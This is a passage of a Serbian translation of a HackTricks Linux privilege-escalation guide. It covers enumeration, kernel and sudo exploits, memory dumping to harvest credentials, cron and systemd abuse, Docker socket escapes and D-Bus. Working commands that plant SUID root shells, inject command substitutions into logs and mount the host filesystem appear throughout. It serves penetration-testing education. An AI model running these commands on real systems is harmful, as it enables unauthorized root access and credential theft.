# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem osnovnih informacija o pokrenutom OS-u
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za pisanje u bilo kojem direktorijumu unutar promenljive `PATH`**, možda ćete moći da hijack-ujete neke biblioteke ili binarne fajlove:
```bash
echo $PATH
```
### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u promenljivama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji exploit koji se može iskoristiti za eskalaciju privilegija.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih verzija kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive verzije kernela sa te web stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti NA victim-u, proverava samo exploits za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom kernel exploit-u i tako ćete biti sigurni da je taj exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih verzija sudo koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: potvrda potpisa nije uspela

Pogledajte **smasher2 box of HTB** za **primer** kako bi se ova vuln mogla iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Detaljnija enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Navedi moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako ste unutar docker container-a, možete pokušati da escape-ujete iz njega:


{{#ref}}
docker-security/
{{#endref}}

## Pogoni

Proverite **šta je mounted i šta je unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite za privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Navedite korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proveri da li je **instaliran bilo koji kompajler**. Ovo je korisno ako treba da koristiš neki kernel exploit, jer se preporučuje da ga kompajliraš na mašini na kojoj ćeš ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagios (na primer) koja bi se mogla iskoristiti za escalating privileges…\
Preporučuje se ručno proveriti verzije sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, stoga se preporučuju aplikacije poput OpenVAS ili slične koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Takođe **proveri svoje privilegije nad binarnim fajlovima procesa**, možda možeš prepisati neki.

### Process monitoring

Možeš koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti vrlo korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neki servisi na serveru čuvaju **credentials u čistom tekstu u memoriji**.\
Obično će ti trebati **root privileges** da pročitaš memoriju procesa koji pripadaju drugim korisnicima, zato je ovo obično korisnije kada si već root i želiš da otkriješ još credentials.\
Međutim, zapamti da **kao običan korisnik možeš čitati memoriju procesa koje poseduješ**.

> [!WARNING]
> Imaj na umu da danas većina mašina **ne dozvoljava ptrace podrazumevano**, što znači da ne možeš dump-ovati druge procese koji pripadaju neprivilegovanom korisniku.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ako imaš pristup memoriji FTP servisa (na primer) možeš dohvatiti Heap i pretražiti u njemu njegove credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati process ID, **maps prikazuju kako je memorija mapirana unutar** virtuelnog adresnog prostora tog procesa; takođe prikazuju **dozvole svake mapirane regije**. Pseudo fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske regije čitljive** i njihove offset-e. Koristimo ove informacije da se **pozicioniramo u mem fajl i iskopiramo sve čitljive regione** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` pruža pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Na virtuelni adresni prostor kernela može se pristupiti pomoću /dev/kmem.\
Tipično, `/dev/mem` je čitljiv samo od strane **root** i grupe kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za Linux

ProcDump je Linux reinterpretacija klasičnog ProcDump alata iz Sysinternals skupa alata za Windows. Nabavite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i napraviti dump procesa koji je u vašem vlasništvu
- Script A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je proces authenticator pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da pronađete različite načine za dump the memory of a process) i search for credentials inside the memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti clear text credentials iz memorije** i iz nekih **dobro poznatih fajlova**. Potrebne su root privileges da bi ispravno radio.

| Funkcija                                           | Ime procesa         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Pretraga Regex-ova/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) koji radi kao root – web-based scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti preko SSH local port-forwarding i kreirati privilegovani job za eskalaciju.

Tipičan niz koraka
- Otkrivanje porta dostupnog samo na loopback-u (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađi kredencijale u operativnim artefaktima:
- Backup-ovi/skripte sa `zip -P <password>`
- systemd unit koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunelovanje i prijava:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj job sa visokim privilegijama i pokreni odmah (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje bezbednosti
- Ne pokrećite Crontab UI kao root; ograničite ga na poseban korisnički nalog i minimalne dozvole
- Bind to localhost i dodatno ograničite pristup preko firewall/VPN; ne koristite iste lozinke ponovo
- Izbegavajte ugrađivanje secrets u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za izvršavanja zadataka na zahtev

Proverite da li je neki zakazani zadatak ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na primer, u _/etc/crontab_ možete naći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Primetite da korisnik "user" ima prava za pisanje nad /home/user_)

Ako u ovom crontab-u root pokuša da izvrši neku komandu ili skriptu bez podešavanja PATH-a. На пример: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ako se skripta izvršava kao root i sadrži “**\***” unutar komande, možete to iskoristiti da napravite neočekivane stvari (poput privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard prethodnik putanje kao što je** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Zašto ovo funkcioniše: U Bash-u, expansions se dešavaju u sledećem redosledu: parameter/variable expansion, command substitution, arithmetic expansion, zatim word splitting i pathname expansion. Dakle, vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zamenjuje (komanda se izvršava), a preostali numerički `0` se koristi za arithmetic tako da skripta nastavlja bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Ubacite u parsovani log tekst koji napadač kontroliše tako da polje koje liči na broj sadrži command substitution i završava cifrom. Pazite da vaša komanda ne ispisuje na stdout (ili je preusmerite) kako bi arithmetic ostao validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron script** koji se izvršava kao root, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji pokreće root koristi **direktorijum na koji imate potpuni pristup**, možda bi bilo korisno obrisati taj folder i **napraviti symlink ka drugom folderu** koji sadrži script pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron jobs

Možeš da nadzireš procese da bi pronašao one koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda to možeš iskoristiti i escalate privileges.

Na primer, da bi **pratio svakih 0.1s tokom 1 minuta**, **sortirao po najmanje izvršenim komandama** i obrisao komande koje su se najviše izvršavale, možeš uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i ispisati svaki proces koji se pokrene).

### Invisible cron jobs

Moguće je kreirati cronjob **stavivši carriage return nakon komentara** (bez newline karaktera), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisive _.service_ datoteke

Proverite da li možete upisati bilo koju `.service` datoteku, ako možete, možete je **izmeniti** tako da **izvršava** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate dok se mašina ne restartuje).\
Na primer, kreirajte svoj backdoor unutar .service datoteke sa **`ExecStart=/tmp/script.sh`**

### Upisive binarne datoteke servisa

Imajte na umu da ako imate **prava za pisanje nad binarnim fajlovima koje pokreću servisi**, možete ih promeniti da sadrže backdoor, pa će kada se servisi ponovo budu izvršeni backdoor biti izvršen.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kojem od direktorijuma na toj putanji, možda ćete moći **escalate privileges**. Treba da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršni fajl** sa **istim imenom kao relativni put binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se od servisa zatraži izvršavanje ranjive akcije (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu startovati/stopirati servise, ali proverite da li možete koristiti `sudo -l`).

**Saznajte više o servisima koristeći `man systemd.service`.**

## **Timeri**

**Timeri** su systemd unit fajlovi čije ime se završava na `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Timeri** se mogu koristiti kao alternativa cron-u, jer imaju ugrađenu podršku za događaje bazirane na kalendarskom vremenu i događaje bazirane na monotonom vremenu, i mogu se pokretati asinhrono.

Možete izlistati sve timere pomoću:
```bash
systemctl list-timers --all
```
### Upisivi tajmeri

Ako možete izmeniti tajmer, možete ga naterati da pokrene postojeće systemd.unit (npr. `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer unit, osim sufiksa. (Vidi gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovu privilegiju potrebno je da:

- Pronađite neku systemd unit (kao `.service`) koja je **executing a writable binary**
- Pronađite neku systemd unit koja je **executing a relative path** i nad **systemd PATH** imate **writable privileges** (da imitujete taj executable)

**Saznajte više o timerima pomoću `man systemd.timer`.**

### **Omogućavanje Timera**

Da biste omogućili timer potrebne su root privilegije i izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena: **timer** je **aktiviran** kreiranjem symlinka ka njemu u `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istoj ili različitim mašinama unutar client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i konfigurišu se kroz `.socket` fajlove.

Sockets se mogu konfigurisati koristeći `.socket` fajlove.

**Saznajte više o sockets pomoću `man systemd.socket`.** U ovom fajlu mogu se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali suštinski služe da **naznače gde će se slušati** socket (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta koji će se slušati, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, **stvara se instanca servisa za svaku dolaznu konekciju** i samo konekcioni socket joj se prosleđuje. Ako je **false**, svi listening socket-i se **prosleđuju pokrenutoj service jedinici**, i pokreće se samo jedna service jedinica za sve konekcije. Ova vrednost se ignoriše za datagram socket-e i FIFO-e gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se da novi daemoni budu pisani na način pogodan za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija, koje se **izvršavaju pre** ili **posle** kreiranja i bind-ovanja listening **sockets**/FIFO-a, respektivno. Prvi token komandne linije mora biti apsolutno ime fajla, nakon čega slede argumenti procesa.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja listening **sockets**/FIFO-a, respektivno.
- `Service`: Specificira ime **service** jedinice koje će se **aktivirati** pri **dolaznom saobraćaju**. Ova opcija je dozvoljena samo za socket-e sa Accept=no. Podrazumevano je service koji ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije neophodno koristiti ovu opciju.

### Writable .socket files

Ako pronađete **writable** `.socket` fajl, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Stoga, **verovatno ćete morati da sačekate da se mašina restartuje.**\
_Napomena da sistem mora koristiti tu konfiguraciju socket fajla ili backdoor neće biti izvršen_

### Writable sockets

Ako **identifikujete bilo koji writable socket** (_sada govorimo o Unix Sockets, a ne o konfiguracionim `.socket` fajlovima_), onda **možete komunicirati** sa tim socket-om i možda iskoristiti ranjivost.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Obratite pažnju da može postojati nekoliko **sockets koji slušaju HTTP** zahteva (_Ne mislim na .socket fajlove već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti sa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovori na HTTP** zahtev, možete sa njim **komunicirati** i možda **exploit some vulnerability**.

### Docker socket koji se može upisati

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. Podrazumevano, dostupan je za upis korisniku `root` i članovima `docker` grupe. Imati pristup za pisanje ovom socket-u može dovesti do privilege escalation. Ovde je pregled kako se to može uraditi i alternativne metode ukoliko Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate pristup za pisanje Docker socketa, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete kontejner sa root pristupom fajl sistemu hosta.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Preuzmite listu dostupnih image-ova.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje kontejnera koji mount-uje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju ka kontejneru, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete izvršavati komande direktno u kontejneru sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte na umu da, ako imate dozvole za pisanje nad docker socket-om zato što ste **unutar grupe `docker`** imate [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako je [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **još načina da izađete iz docker-a ili da ga zloupotrebite za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako ustanovite da možete da koristite **`ctr`** komandu, pročitajte sledeću stranicu jer **možda ćete moći da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacija privilegija RunC

Ako ustanovite da možete da koristite **`runc`** komandu, pročitajte sledeću stranicu jer **možda ćete moći da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticovan **inter-procesni komunikacioni sistem (IPC)** koji omogućava aplikacijama efikasnu interakciju i deljenje podataka. Dizajniran za moderni Linux sistem, nudi robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržavajući osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Štaviše, pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može navesti plejer muzike da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, čineći procese koji su tradicionalno bili kompleksni jednostavnijim.

D-Bus funkcioniše po modelu dozvoljavanje/odbijanje, upravljajući permisijama poruka (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta podudaranja pravila politike. Ove politike preciziraju interakcije sa bus-om, što potencijalno može omogućiti eskalaciju privilegija kroz eksploataciju ovih permisija.

Primer takve politike u /etc/dbus-1/system.d/wpa_supplicant.conf je naveden, detaljno opisujući dozvole za root korisnika da poseduje, šalje i prima poruke od fi.w1.wpa_supplicant1.

Politike bez specificiranog korisnika ili grupe važe univerzalno, dok politike u "default" kontekstu važe za sve koji nisu obuhvaćeni nekim drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Naučite kako da enumerate i exploit D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerate mrežu i utvrditi poziciju mašine.

### Generička enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
